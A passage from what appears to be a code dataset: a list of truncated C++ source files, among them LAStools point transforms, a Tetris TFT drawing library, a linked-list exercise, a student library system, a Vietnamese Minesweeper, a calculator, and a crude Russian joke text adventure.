offset[2]); };\n\tinline U32 get_decompress_selective() const { return LASZIP_DECOMPRESS_SELECTIVE_CHANNEL_RETURNS_XY | LASZIP_DECOMPRESS_SELECTIVE_Z; };\n\tinline void transform(LASpoint* point) {\n\t\tif (!point->set_x(point->get_x() + offset[0]))\n\t\t{\n\t\t\toverflow++;\n\t\t}\n\t\tif (!point->set_y(point->get_y() + offset[1]))\n\t\t{\n\t\t\toverflow++;\n\t\t}\n\t\tif (!point->set_z(point->get_z() + offset[2]))\n\t\t{\n\t\t\toverflow++;\n\t\t}\n\t};\n\tLASoperationTranslateXYZ(F64 x_offset, F64 y_offset, F64 z_offset) { this->offset[0] = x_offset; this->offset[1] = y_offset; this->offset[2] = z_offset; };\nprivate:\n\tF64 offset[3];\n};\n\nclass LASoperationScaleX : public LASoperation\n{\npublic:\n\tinline const CHAR* name() const { return \"scale_x\"; };\n\tinline I32 get_command(CHAR* string) const { return sprintf(string, \"-%s %lf \", name(), scale); };\n\tinline void transform(LASpoint* point) {\n\t\tif (!point->set_x(point->get_x() * scale))\n\t\t{\n\t\t\toverflow++;\n\t\t}\n\t};\n\tLASoperationScaleX(F64 scale) { this->scale = scale; };\nprivate:\n\tF64 scale;\n};\n\nclass LASoperationScaleY : public LASoperation\n{\npublic:\n\tinline const CHAR* name() const { return \"scale_y\"; };\n\tinline I32 get_command(CHAR* string) const { return sprintf(string, \"-%s %lf \", name(), scale); };\n\tinline void transform(LASpoint* point) {\n\t\tif (!point->set_y(point->get_y() * scale))\n\t\t{\n\t\t\toverflow++;\n\t\t}\n\t};\n\tLASoperationScaleY(F64 scale) { this->scale = scale; };\nprivate:\n\tF64 scale;\n};\n\nclass LASoperationScaleZ : public LASoperation\n{\npublic:\n\tinline const CHAR* name() const { return \"scale_z\"; };\n\tinline I32 get_command(CHAR* string) const { return sprintf(string, \"-%s %lf \", name(), scale); };\n\tinline U32 get_decompress_selective() const { return LASZIP_DECOMPRESS_SELECTIVE_Z; };\n\tinline void transform(LASpoint* point) {\n\t\tif (!point->set_z(point->get_z() * scale))\n\t\t{\n\t\t\toverflow++;\n\t\t}\n\t};\n\tLASoperationScaleZ(F64 scale) { this->scale = scale; };\nprivate:\n\tF64 scale;\n};\n\nclass LASoperationScaleXYZ : public LASoperation\n{\npublic:\n\tinline const CHAR* name() const { return \"scale_xyz\"; };\n\tinline I32 get_command(CHAR* string) const { return sprintf(string, \"-%s %lf %lf %lf \", name(), scale[0], scale[1], scale[2]); };\n\tinline U32 get_decompress_selective() const { return LASZIP_DECOMPRESS_SELECTIVE_CHANNEL_RETURNS_XY | LASZIP_DECOMPRESS_SELECTIVE_Z; };\n\tinline void transform(LASpoint* point) {\n\t\tif (!point->set_x(point->get_x() * scale[0]))\n\t\t{\n\t\t\toverflow++;\n\t\t}\n\t\tif (!point->set_y(point->get_y() * scale[1]))\n\t\t{\n",
    "/*\nCopyright (c) 2019 Roberto Cazzaro . All right reserved.\n\nTetris TFT library \nBased on https://github.com/toblum/TetrisAnimation, adapted\nfor TFT screens, 3D block effects and lateral movements\n\nCopyright (c) 2018 Tobias Blum . All right reserved.\n\nTetris Matrix Clock\n\nThis library is free software; you can redistribute it and/or\nmodify it under the terms of the GNU Lesser General Public\nLicense as published by the Free Software Foundation; either\nversion 2.1 of the License, or (at your option) any later version.\nThis library is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\nLesser General Public License for more details.\nYou should have received a copy of the GNU Lesser General Public\nLicense along with this library; if not, write to the Free Software\nFoundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA\n*/\n\n\n#include \"TetrisTFTDraw.h\"\n#include \"TetrisNumbers.h\"\n#include \"TetrisLetters.h\"\n\n// Uses Adafruit GFX library by default unless TFT_ESPI is defined\n#if DISPLAY_LIBRARY == TFT_ESPI\nTetrisTFTDraw::TetrisTFTDraw(TFT_eSPI &display)\t\n{\n    this->display = &display;\n    resetNumStates();\n}\n#else\nTetrisMatrixDraw::TetrisMatrixDraw(Adafruit_GFX &display)\t\n{\n    this->display = &display;\n    resetNumStates();\n}\n#endif\n\nvoid TetrisTFTDraw::drawChar(String letter, uint8_t x, uint8_t y, uint16_t color)\n{\n    this->display->setTextColor(color);\n    this->display->setCursor(x, y);\n    this->display->print(letter);\n}\n\n// *********************************************************************\n// Draws a brick shape at a given position\n// *********************************************************************\nvoid TetrisTFTDraw::drawShape(int blocktype, uint16_t color, int x_pos, int y_pos, int num_rot)\n{\n  // Square\n  if (blocktype == 0)\n  {\n    this->display->drawPixel(x_pos, y_pos, color);\n    this->display->drawPixel(x_pos + 1, y_pos, color);\n    this->display->drawPixel(x_pos, y_pos - 1, color);\n    this->display->drawPixel(x_pos + 1, y_pos - 1, color);\n  }\n\n  // L-Shape\n  if (blocktype == 1)\n  {\n    if (num_rot == 0)\n    {\n      this->display->drawPixel(x_pos, y_pos, color);\n      this->display->drawPixel(x_pos + 1, y_pos, color);\n      this->display->drawPixel(x_pos, y_pos - 1, color);\n      this->display->drawPixel(x_pos, y_pos - 2, color);\n    }\n    if (num_rot == 1)\n    {\n      this->display->drawPixel(x_pos, y_pos, color);\n      this->display->drawPixel(x_pos, y_pos - 1, color);\n      this->display->drawPixel(x_pos + 1, y_pos - 1, color);\n      this->display->drawPixel(x_pos + 2, y_pos - 1, color);\n    }\n    if (num_rot == 2)\n    {\n      this->display->drawPixel(x_pos + 1, y_pos, color);\n      this->display->drawPixel(x_pos + 1, y_pos - 1, color);\n      this->display->drawPixel(x_pos + 1, y_pos - 2, color);\n      this->display->drawPixel(x_pos, y_pos - 2, color);\n    }\n    if (num_rot == 3)\n    {\n      this->display->drawPixel(x_pos, y_pos, color);\n      this->display->drawPixel(x_pos + 1, y_pos, color);\n      this->display->drawPixel(x_pos + 2, y_pos, color);\n      this->display->drawPixel(x_pos + 2, y_pos - 1, color);\n    }\n  }\n\n  // L-Shape (reverse)\n  if (blocktype == 2)\n  {\n    if (num_rot == 0)\n    {\n      this->display->drawPixel(x_pos, y_pos, color);\n      this->display->drawPixel(x_pos + 1, y_pos, color);\n      this->display->drawPixel(x_pos + 1, y_pos - 1, color);\n      this->display->drawPixel(x_pos + 1, y_pos - 2, color);\n    }\n    if (num_rot == 1)\n    {\n      this->display->drawPixel(x_pos, y_pos, color);\n      this->display->drawPixel(x_pos + 1, y_pos, color);\n      this->display->drawPixel(x_pos + 2, y_pos, color);\n      this->display->drawPixel(x_pos, y_pos - 1, color);\n    }\n    if (num_rot == 2)\n    {\n      this->display->drawPixel(x_pos, y_pos, color);\n      this->display->drawPixel(x_pos, y_pos - 1, color);\n      this->display->drawPixel(x_pos, y_pos - 2, color);\n      this->display->drawPixel(x_pos + 1, y_pos - 2, color);\n    }\n    if (num_rot == 3)\n    {\n      this->display->drawPixel(x_pos, y_pos - 1, color);\n      this->display->drawPixel(x_pos + 1, y_pos - 1, color);\n      this->display->drawPixel(x_pos + 2, y_pos - 1, color);\n      this->display->drawPixel(x_pos + 2, y_pos, color);\n    }\n  }\n\n  // I-Shape\n  if (blocktype == 3)\n  {\n    if (num_rot == 0 || num_rot == 2)\n    { // Horizontal\n      this->display->drawPixel(x_pos, y_pos, color);\n      this->display->drawPixel(x_pos + 1, y_pos, color);\n      this->display->drawPixel(x_pos + 2, y_pos, color);\n      this->display->drawPixel(x_pos + 3, y_pos, color);\n    }\n    if (num_rot == 1 || num_rot == 3)\n    { // Vertical\n      this->display->drawPixel(x_pos, y_pos, color);\n      this->display->drawPixel(x_pos, y_pos - 1, color);\n      this->display->drawPixel(x_pos, y_pos - 2, color);\n      this->display->drawPixel(x_pos, y_pos - 3, color);\n    }\n  }\n\n  // S-Shape\n  if (blocktype == 4)\n  ",
    "/*\nA critical point in a linked list is defined as either a local maxima or a local minima.\nA node is a local maxima if the current node has a value strictly greater than the\nprevious node and the next node. A node is a local minima if the current node has a\nvalue strictly smaller than the previous node and the next node. Note that a node can\nonly be a local maxima/minima if there exists both a previous node and a next node.\nGiven a linked list head, return an array of length 2 containing\n[minDistance, maxDistance] where minDistance is the minimum distance between any\ntwo distinct critical points and maxDistance is the maximum distance between any\ntwo distinct critical points. If there are fewer than two critical points,\nreturn [-1, -1].\n*/\n#include <bits/stdc++.h>\nusing namespace std;\n\n// Definition for singly-linked list node\nstruct ListNode\n{\n    int val;\n    ListNode *next;\n    ListNode() : val(0), next(nullptr) {}\n    ListNode(int x) : val(x), next(nullptr) {}\n    ListNode(int x, ListNode *next) : val(x), next(next) {}\n};\n\nclass Solution\n{\npublic:\n    // Function to find the minimum and maximum distances between critical points\n    vector<int> nodesBetweenCriticalPoints(ListNode *head)\n    {\n        // Check if the list has at least 3 nodes\n        if (head == NULL || head->next == NULL || head->next->next == NULL)\n            return {-1, -1};\n\n        ListNode *prev = head;\n        ListNode *curr = head->next;\n        vector<int> ans = {-1, -1}; // Initialize result vector\n        int prePos = -1, curPos = -1, firstPos = -1, pos = 0;\n\n        // Traverse the linked list\n        while (curr->next != nullptr)\n        {\n            // Check if current node is a critical point (local maxima or minima)\n            if ((curr->val < prev->val && curr->val < curr->next->val) || \n                (curr->val > prev->val && curr->val > curr->next->val))\n            {\n                prePos = curPos;\n                curPos = pos;\n                \n                // Update firstPos if this is the first critical point\n                if (firstPos == -1)\n                    firstPos = pos;\n                \n                // Update minimum and maximum distances\n                if (prePos != -1)\n                {\n                    if (ans[0] == -1)\n                        ans[0] = curPos - prePos;\n                    else\n                        ans[0] = min(ans[0], curPos - prePos);\n                    ans[1] = pos - firstPos;\n                }\n            }\n            pos++;\n            prev = curr;\n            curr = curr->next;\n        }\n        return ans;\n    }\n};\n\nint main()\n{\n    int n;\n    cin >> n; // Input number of nodes\n\n    // Create linked list from input\n    ListNode *head = nullptr;\n    ListNode *tail = nullptr;\n    for (int i = 0; i < n; i++)\n    {\n        int x;\n        cin >> x;\n        ListNode *newNode = new ListNode(x);\n        if (head == nullptr)\n        {\n            head = newNode;\n            tail = newNode;\n        }\n        else\n        {\n            tail->next = newNode;\n            tail = newNode;\n        }\n    }\n\n    // Call the function to find critical points\n    vector<int> ans = Solution().nodesBetweenCriticalPoints(head);\n    \n    // Print the result\n    cout << ans[0] << \" \" << ans[1] << endl;\n\n    return 0;\n}\n\n/*\nTechnical Documentation:\n\n1. Problem:\n   - Find the minimum and maximum distances between critical points in a singly linked list.\n   - A critical point is a local maxima or local minima in the list.\n\n2. Solution Approach:\n   - Traverse the linked list once, keeping track of three consecutive nodes.\n   - Identify critical points by comparing the current node with its previous and next nodes.\n   - Keep track of the positions of critical points and update min/max distances.\n\n3. Time Complexity: O(n), where n is the number of nodes in the linked list.\n   Space Complexity: O(1) additional space (excluding input and output).\n\n4. Key Variables:\n   - prePos: Position of the previous critical point\n   - curPos: Position of the current critical point\n   - firstPos: Position of the first critical point\n   - pos: Current position in the linked list\n   - ans: Vector to store the result [min_distance, max_distance]\n\n5. Algorithm Steps:\n   a. Check if the list has at least 3 nodes; if not, return {-1, -1}.\n   b. Traverse the list using three pointers: prev, curr, and curr->next.\n   c. At each step, check if curr is a critical point.\n   d. If it's a critical point, update prePos, curPos, and firstPos.\n   e. Calculate and update the minimum and maximum distances.\n   f. Return the result vector.\n\n6. Input/Output:\n   - Input: Number of nodes followed by the values of each node.\n   - Output: The linked list values, followed by the min and max distances between critical points.\n\n7. Note:\n   - The solution handles edge cases where there are fewer than two critical points.\n   - Memory management (freeing allocated nodes) is not implemented in this code.\n*/",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <map>\n#include <vector>\n#include <ctime>\n#include <iomanip>\n#include <algorithm>\nusing namespace std;\n\nclass Student\n{\n    public:\n    string name;\n\tint id_no;\n\tstring stream;\n\tstring book1,book2;\n\tint book_no,issuedbook;\n    public:\n    Student(string name, int id_no, string stream) {\n        this->name = name;\n        this->id_no = id_no;\n        this->stream = stream;\n        this->book_no = 0;\n        this->issuedbook = 0;\n\t}\n};\nvoid selectionSort(vector<Student>& arr) {\n    int n = arr.size();\n    for (int i = 0; i < n - 1; i++) {\n        int min_idx = i;\n        for (int j = i + 1; j < n; j++)\n            if (arr[j].id_no < arr[min_idx].id_no)\n                min_idx = j;\n\n        swap(arr[min_idx], arr[i]);\n    }\n}\nvoid display(const vector<Student>& arr) {\n    for (size_t i = 0; i < arr.size(); i++)\n    {\n        const Student &student = arr[i];\n        cout << \"\\nName of Student: \" << student.name;\n        cout << \"\\nId of Student: \" << student.id_no;\n        cout << \"\\nStream of Student: \" << student.stream;\n    }\n}\n\nclass Node {\npublic:\n    string key;\n    Node* left;\n    Node* right;\n\n    Node(string item) {\n        key = item;\n        left = nullptr;\n        right = nullptr;\n    }\n};\n\nclass BST {\nprivate:\n    Node* root;\n\n    Node* insertRec(Node* root, string key) {\n        if (root == nullptr) {\n            root = new Node(key);\n            return root;\n        }\n\n        if (key < root->key)\n            root->left = insertRec(root->left, key);\n        else if (key > root->key)\n            root->right = insertRec(root->right, key);\n\n        return root;\n    }\n\n    bool containsNodeRecursive(Node* current, string key) {\n        if (current == nullptr) return false;\n        if (key == current->key) return true;\n        return key < current->key ?\n            containsNodeRecursive(current->left, key) :\n            containsNodeRecursive(current->right, key);\n    }\n\n    Node* deleteRec(Node* root, string key) {\n        if (root == nullptr) return root;\n\n        if (key < root->key)\n            root->left = deleteRec(root->left, key);\n        else if (key > root->key)\n            root->right = deleteRec(root->right, key);\n        else {\n            if (root->left == nullptr) return root->right;\n            else if (root->right == nullptr) return root->left;\n\n            root->key = minValue(root->right);\n            root->right = deleteRec(root->right, root->key);\n        }\n        return root;\n    }\n\n    string minValue(Node* root) {\n        string minv = root->key;\n        while (root->left != nullptr) {\n            minv = root->left->key;\n            root = root->left;\n        }\n        return minv;\n    }\n\n    void printInorder(Node* node) {\n        if (node == nullptr) return;\n        printInorder(node->left);\n        cout << node->key << \"\\n\";\n        printInorder(node->right);\n    }\n\n    void printTreeRec(Node* t, int space) {\n        if (t == nullptr) return;\n        space += 5;\n        printTreeRec(t->right, space);\n        cout << endl;\n        for (int i = 5; i < space; i++) cout << \" \";\n        cout << \"[\" << t->key << \"]\";\n        printTreeRec(t->left, space);\n    }\n\npublic:\n    BST() { root = nullptr; }\n\n    void insert(string key) {\n        root = insertRec(root, key);\n    }\n\n    void update(string key, string key1) {\n        deleteKey(key);\n        insert(key1);\n    }\n\n    bool containsNode(string value) {\n        return containsNodeRecursive(root, value);\n    }\n\n    void deleteKey(string key) {\n        root = deleteRec(root, key);\n    }\n\n    void printInorder() {\n        printInorder(root);\n        cout << endl;\n    }\n\n    void printTree() {\n        printTreeRec(root, 0);\n        cout << endl;\n    }\n};\n\nint main() {\n    BST tree;\n    map<string, int> hashmapping;\n    vector<Student> array;\n    array.push_back(Student(\"Aayushmaan\", 761, \"B.Tech-CHEMICAL\"));\n    array.push_back(Student(\"Priyanshu\", 279, \"B.Tech-CHEMICAL\"));\n    array.push_back(Student(\"Nirmal\", 479, \"B.Tech-CHEMICAL\"));\n    array.push_back(Student(\"Himanshu\", 321, \"B.Tech-CSE\"));\n    array.push_back(Student(\"Samrat\", 701, \"B.Tech-MINNING\"));\n    array.push_back(Student(\"Rudransh\", 631, \"B.Tech-FOOD\"));\n    int arr[100][2] = {0};\n\n    ifstream infile1(\"subject.txt\");\n    ifstream infile2(\"Available_book.txt\");\n    ifstream infile3(\"Total_book.txt\");\n\n    string line;\n    int i = 0;\n\n    while (getline(infile1, line)) {\n        tree.insert(line);\n        hashmapping[line] = i;\n        i++;\n    }\n    infile1.close();\n\n    int j = i, o = 0, pq = 0;\n    string number;\n\n    while (getline(infile2, number)) {\n        int result = stoi(number);\n        if (j != o) arr[o][0] = result;\n        o++;\n    }\n    infile2.close();\n\n    while (getline(infile3, number)) {\n        int result1 = stoi(number);\n        if (j != pq) arr[pq][1] = result1;\n        pq++;\n    }\n    infile3.close();\n\n    // Choosing student or Librarian\n    bool e1 = false;\n    int choice_1;\n    w",
    "#include <iostream>\n#include <ctime>\n#include <cstdlib>\n#include <cstring>\n#include <thread>\n#include <chrono>\n#include <windows.h>\n\nusing namespace std;\n\n#define max_mine 99\n#define max_side 25\n#define max_move 526\n\nint kichthuoc;\nint mine;\n\nvoid setColor(int color) {\n    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);\n}\n\nvoid clear() {\n    system(\"cls\");\n}\n\nbool phuhop(int hang, int cot) {\n    return (hang >= 0) && (hang < kichthuoc) && (cot >= 0) && (cot < kichthuoc);\n}\n\nbool lamin(int hang, int cot, char board[][max_side]) {\n    return (board[hang][cot] == '*');\n}\n\nvoid make_move(int *x, int *y) {\n    while (true) {\n        cout << \"\\nChon nuoc di cua ban: [hang] [cot] -> \";\n        cin >> *x >> *y;\n        if ((*x < kichthuoc) && (*y < kichthuoc)) {\n            return;\n        }\n    }\n}\n\nvoid printboard(char bangcuatoi[][max_side]) {\n    clear();\n    cout << \"\\n\\n\\t\\t\\t    \";\n\n    for (int i = 0; i < kichthuoc; i++) {\n        if (i > 9)\n            cout << i / 10 << \" \";\n        else\n            cout << \"  \";\n    }\n\n    cout << \"\\n\\t\\t\\t    \";\n\n    for (int i = 0; i < kichthuoc; i++)\n        cout << i % 10 << \" \";\n\n    cout << \"\\n\\n\";\n\n    for (int i = 0; i < kichthuoc; i++) {\n        cout << \"\\t\\t\\t    \";\n        for (int j = 0; j < kichthuoc; j++) {\n            if (bangcuatoi[i][j] == '*') {\n                setColor(14); // m\u00ecn m\u00e0u v\u00e0ng\n                cout << bangcuatoi[i][j] << \" \";\n                setColor(15); // \u0111en th\u00e0nh tr\u1eafng\n            } else if (isdigit(bangcuatoi[i][j])) {\n                int digit = bangcuatoi[i][j] - '0';\n                if (digit == 1) {\n                    setColor(10); // 1 l\u00e0 xanh l\u00e1\n                } else if (digit == 2) {\n                    setColor(9); // xanh d\u01b0\u01a1ng l\u00e0 2\n                } else if (digit == 3) {\n                    setColor(12); // \u0111\u1ecf l\u00e0 3\n                }\n                cout << bangcuatoi[i][j] << \" \";\n                setColor(15); // \u0111en th\u00e0nh tr\u1eafng\n            } else {\n                cout << bangcuatoi[i][j] << \" \";\n            }\n        }\n        cout << \" \" << i << \"\\n\";\n    }\n    return;\n}\n\n\nint countadjacent(int hang, int cot, int min[][2], char bangthat[][max_side]) {\n    int count = 0;\n\n    if (phuhop(hang - 1, cot) && lamin(hang - 1, cot, bangthat))\n        count++;\n\n    if (phuhop(hang + 1, cot) && lamin(hang + 1, cot, bangthat))\n        count++;\n\n    if (phuhop(hang, cot + 1) && lamin(hang, cot + 1, bangthat))\n        count++;\n\n    if (phuhop(hang, cot - 1) && lamin(hang, cot - 1, bangthat))\n        count++;\n\n    if (phuhop(hang - 1, cot - 1) && lamin(hang - 1, cot - 1, bangthat))\n        count++;\n\n    if (phuhop(hang - 1, cot + 1) && lamin(hang - 1, cot + 1, bangthat))\n        count++;\n\n    if (phuhop(hang + 1, cot - 1) && lamin(hang + 1, cot - 1, bangthat))\n        count++;\n\n    if (phuhop(hang + 1, cot + 1) && lamin(hang + 1, cot + 1, bangthat))\n        count++;\n\n    return count;\n}\n\nbool playminesuntil(char bangcuatoi[][max_side], char bangthat[][max_side], int min[][2], int hang, int cot, int *moves_left) {\n    if (bangcuatoi[hang][cot] != '-') {\n        return false;\n    }\n\n    int i, j;\n    if (bangthat[hang][cot] == '*') {\n        bangcuatoi[hang][cot] = '*';\n        for (i = 0; i < mine; i++)\n            bangcuatoi[min[i][0]][min[i][1]] = '*';\n\n        printboard(bangcuatoi);\n        cout << \"\\nBan thua roi !\\n\";\n\n        this_thread::sleep_for(chrono::seconds(10));\n\n        return true;\n    } else {\n        int count = countadjacent(hang, cot, min, bangthat);\n        (*moves_left)--;\n\n        bangcuatoi[hang][cot] = count + '0';\n\n        if (!count) {\n            if (phuhop(hang - 1, cot) && !lamin(hang - 1, cot, bangthat))\n                playminesuntil(bangcuatoi, bangthat, min, hang - 1, cot, moves_left);\n\n            if (phuhop(hang + 1, cot) && !lamin(hang + 1, cot, bangthat))\n                playminesuntil(bangcuatoi, bangthat, min, hang + 1, cot, moves_left);\n\n            if (phuhop(hang, cot + 1) && !lamin(hang, cot + 1, bangthat))\n                playminesuntil(bangcuatoi, bangthat, min, hang, cot + 1, moves_left);\n\n            if (phuhop(hang, cot - 1) && !lamin(hang, cot - 1, bangthat))\n                playminesuntil(bangcuatoi, bangthat, min, hang, cot - 1, moves_left);\n\n            if (phuhop(hang - 1, cot + 1) && !lamin(hang - 1, cot + 1, bangthat))\n                playminesuntil(bangcuatoi, bangthat, min, hang - 1, cot + 1, moves_left);\n\n            if (phuhop(hang - 1, cot - 1) && !lamin(hang - 1, cot - 1, bangthat))\n                playminesuntil(bangcuatoi, bangthat, min, hang - 1, cot - 1, moves_left);\n\n            if (phuhop(hang + 1, cot + 1) && !lamin(hang + 1, cot + 1, bangthat))\n                playminesuntil(bangcuatoi, bangthat, min, hang + 1, cot + 1, moves_left);\n\n            if (phuhop(hang + 1, cot - 1) && !lamin(hang + 1, cot - 1, bangthat))\n                playminesuntil(bangcuatoi, bangthat, min, hang + 1, cot - 1, moves_left);\n        }\n        return false;\n    }\n}\n\nvoid ",
    "#include <iostream>\r\n#include <limits>\r\n#include <cmath>\r\n\r\nusing namespace std;\r\n\r\nvoid displayMenu() {\r\n    cout << \"===================\" << endl;\r\n    cout << \"  Digital Calculator\" << endl;\r\n    cout << \"===================\" << endl;\r\n    cout << \"1. Addition\" << endl;\r\n    cout << \"2. Subtraction\" << endl;\r\n    cout << \"3. Multiplication\" << endl;\r\n    cout << \"4. Division\" << endl;\r\n    cout << \"5. Modulus\" << endl;\r\n    cout << \"6. Power\" << endl;\r\n    cout << \"7. Exit\" << endl;\r\n    cout << \"Choose an operation: \";\r\n}\r\n\r\nbool isValidNumber(double& number) {\r\n    if (cin.fail()) {\r\n        cin.clear(); // clear the error flag\r\n        cin.ignore(numeric_limits<streamsize>::max(), '\\n'); // discard invalid input\r\n        return false;\r\n    }\r\n    return true;\r\n}\r\n\r\ndouble getNumberInput(const string& prompt) {\r\n    double num;\r\n    cout << prompt;\r\n    cin >> num;\r\n    while (!isValidNumber(num)) {\r\n        cout << \"Invalid input. Please enter a valid number: \";\r\n        cin >> num;\r\n    }\r\n    return num;\r\n}\r\n\r\nint main() {\r\n    cout<<\"Task-2:DIGITAL CALCULATOR\"<<endl<<\"Made by Ashish\"<<endl;\r\n    int choice;\r\n    double num1, num2, result;\r\n\r\n    while (true) {\r\n        displayMenu();\r\n        cin >> choice;\r\n\r\n        if (choice == 7) {\r\n            cout << \"Exiting...\" << endl;\r\n            break;\r\n        }\r\n\r\n        num1 = getNumberInput(\"Enter first number: \");\r\n        num2 = getNumberInput(\"Enter second number: \");\r\n\r\n        switch (choice) {\r\n            case 1:\r\n                result = num1 + num2;\r\n                cout << \"Result: \" << result << endl;\r\n                break;\r\n            case 2:\r\n                result = num1 - num2;\r\n                cout << \"Result: \" << result << endl;\r\n                break;\r\n            case 3:\r\n                result = num1 * num2;\r\n                cout << \"Result: \" << result << endl;\r\n                break;\r\n            case 4:\r\n                if (num2 == 0) {\r\n                    cout << \"Error: Division by zero is not allowed.\" << endl;\r\n                } else {\r\n                    result = num1 / num2;\r\n                    cout << \"Result: \" << result << endl;\r\n                }\r\n                break;\r\n            case 5:\r\n                if (floor(num1) != num1 || floor(num2) != num2) {\r\n                    cout << \"Error: Modulus operation requires integer operands.\" << endl;\r\n                } else {\r\n                    result = static_cast<int>(num1) % static_cast<int>(num2);\r\n                    cout << \"Result: \" << result << endl;\r\n                }\r\n                break;\r\n            case 6:\r\n                result = pow(num1, num2);\r\n                cout << \"Result: \" << result << endl;\r\n                break;\r\n            default:\r\n                cout << \"Invalid choice. Please select a valid operation.\" << endl;\r\n                break;\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "\ufeff//NedoRPG. PoStMoDeRn edition.\r\n// 2024-2024. \u0416\u0434\u0443 2228, \u0447\u044c\u0442\u043e\u0431\u044b \u043f\u043e \u0440\u0436\u0430\u0442\u044c. (\u0426\u044b\u0444\u0440\u043e\u0432\u044b\u0435 \u0430\u0440\u0445\u0435\u043e\u043b\u043e\u0433\u0438, \u0435\u0441\u043b\u0438 \u0432\u044b \u0447\u0438\u0442\u0430\u0435\u0442\u0435 \u044d\u0442\u043e\u0442 \u043a\u043e\u043c\u043c\u0435\u043d\u0442\u0430\u0440\u0438\u0439, \u0436\u0435\u043b\u0430\u044e \u0432\u0430\u043c \u0443\u043c\u0435\u0440\u0435\u0442\u044c \u043e\u0442 \u041f\u043e\u041d\u043e\u0421\u0430)))))\r\n//\u0412\u0441\u0435 \u043f\u0440\u0430\u0432\u0430 (\u0438 \u043b\u0435\u0432\u0430) \u043d\u0435 \u0437\u0430\u0449\u0438\u0449\u0435\u043d\u044b, \u043a\u043e\u043f\u0438\u043f\u0430\u0441\u0442\u0438\u0442\u0435 \u0441\u043c\u0435\u043b\u043e (\u0442\u043e\u043b\u044c\u043a\u043e \u0443\u0447\u0442\u0438\u0442\u0435, \u0432\u0430\u0448 \u043f\u0440\u043e\u044d\u043a\u0442 \u043c\u043e\u0436\u0435\u0442 \u0443\u043c\u0435\u0440\u0435\u0442\u044c \u043d\u0430\u0441\u043c\u0435\u0440\u0442\u044c \u043e\u0442 \u0433\u043e\u0432\u043d\u043e\u043a\u043e\u0434\u0430...)\r\n//\u041a\u043e\u043c\u043c\u0443\u043d\u0438\u0437 \u043f\u043e\u0434\u0435\u0431\u0438\u0442\r\n\r\n\r\n#include <ctime>\r\n#include <iostream>\r\n#include <cstdlib>\r\n\r\nusing namespace std;\r\n\r\nchar q0;\r\nchar q1;\r\nchar q2;\r\nchar q3;\r\nchar q4;\r\nchar q5;\r\nchar q6;\r\nchar q7;\r\nchar q8;\r\nchar q9;\r\nchar q10;\r\nchar q11;\r\nchar q12;\r\nchar q13;\r\nchar q14;\r\nchar q15;\r\nchar q16;\r\nchar q17;\r\nchar q18;\r\nchar q19;\r\nchar q20;\r\nchar q21;\r\nchar q22;\r\nchar q23;\r\nchar q24;\r\nchar q25;\r\nchar q26;\r\nchar q27;\r\nchar q28;\r\nchar q29;\r\nchar q30;\r\nchar q31;\r\nchar q32;\r\nchar q33;\r\nchar q34;\r\nchar q35;\r\nchar q36;\r\nchar q37;\r\nchar q38;\r\nchar q39;\r\nchar q40;\r\nchar q41;\r\nchar q42;\r\nchar q43;\r\nchar q44;\r\nchar q45;\r\nchar q46;\r\nchar q47;\r\nchar q48;\r\nchar q49;\r\nchar q50;\r\nchar q51;\r\nchar q52;\r\nchar q53;\r\nchar q54;\r\nchar q55;\r\nchar q56;\r\nchar q57;\r\nchar q58;\r\nchar q59;\r\nchar q60;\r\nchar q61;\r\nchar q62;\r\nchar q63;\r\nchar q64;\r\nchar q65;\r\nchar q66;\r\nchar q67;\r\nchar q68;\r\n\r\n\r\nchar anasha0;\r\nchar anasha1;\r\n\r\nchar trax0;\r\nchar trax1;\r\n\r\nchar lagushkaASK;\r\n\r\nint NePov = 0;\r\nint OscBlag = 0;\r\nint boompalka = 0;\r\n\r\nint EIQPDHKLQSKJHWFJK = 1;\r\n\r\nint costil0 = 1; //\u043c\u043c\u043c \u043a\u043e\u0441\u0442\u044b\u043b\u0438...\r\nint costil1 = 1; //\u043c\u043c\u043c \u043a\u043e\u0441\u0442\u044b\u043b\u0438...\r\nint costil2 = 1; //\u043c\u043c\u043c \u043a\u043e\u0441\u0442\u044b\u043b\u0438...\r\nint costil3 = 0; //\u043c\u043c\u043c \u043a\u043e\u0441\u0442\u044b\u043b\u0438...\r\n\r\n//\u043e\u043d\u0438 \u043a\u0441\u0442\u0430 \u043d\u0438\u043d\u0430\u0447\u0435 \u043d\u0435 \u0432\u043b\u0438\u044f\u044e\u0442. \u0430\u0445\u0430\u0445\u0430\u0445\u0430\u0445?\r\n\r\nint money = 100;\r\nint lvl = 1;\r\n\r\nvoid func68() {\r\n    cout << \"\u0412\u044b \u0432\u0438\u0434\u0438\u0442\u0435 \u041f\u043e\u0441\u0442\u043c\u043e\u0434\u0435\u0440\u043d. \u0425\u043e\u0442\u0438\u0442\u0435 \u0442\u0440\u0430\u0445\u043d\u0443\u0442\u044c \u043a\u043e\u043d\u044f? (y/n)\\n\";\r\n    cin >> q68;\r\n    if (q68 == 'y') {\r\n        cout << \"\u041a\u043e\u043d\u044c \u0442\u0440\u0430\u0445\u043d\u0443\u043b \u0432\u0430\u0441. \u041f\u043e\u0441\u0442\u043c\u043e\u0434\u0435\u0440\u043d \u043f\u043e\u0431\u0435\u0434\u0438\u043b...\\n\";\r\n        system(\"pause\");\r\n        cout << \"\u0412\u044b \u0443\u043c\u0435\u0440\u043b\u0438 \u043d\u0430\u0441\u043c\u0435\u0440\u0442\u044c.\\n\";\r\n        system(\"pause\");\r\n        exit(0);\r\n    }\r\n    else if (q68 == 'n') {\r\n        cout << \"\u0411\u043b\u044f\u0442\u044c \u044f \u043d\u0435 \u0437\u043d\u0430\u044e \u043a\u0430\u043a \u044d\u0442\u043e \u043a\u043e\u043c\u043c\u0435\u043d\u0442\u0438\u0440\u043e\u0432\u0430\u0442\u044c...\\n\";\r\n        system(\"pause\");\r\n        cout << \"\u0421\u043c\u0415\u0448\u041d\u043e \u0436\u0435)))))\\n\";\r\n        system(\"pause\");\r\n        cout << \"\u041f\u041e\u0428\u0415\u041b \u0412 \u041f\u0418\u0417\u0414\u0423 \u041f\u041e\u0428\u0415\u041b \u0412 \u041f\u0418\u0417\u0414\u0423 \u041f\u041e\u0428\u0415\u041b \u0412 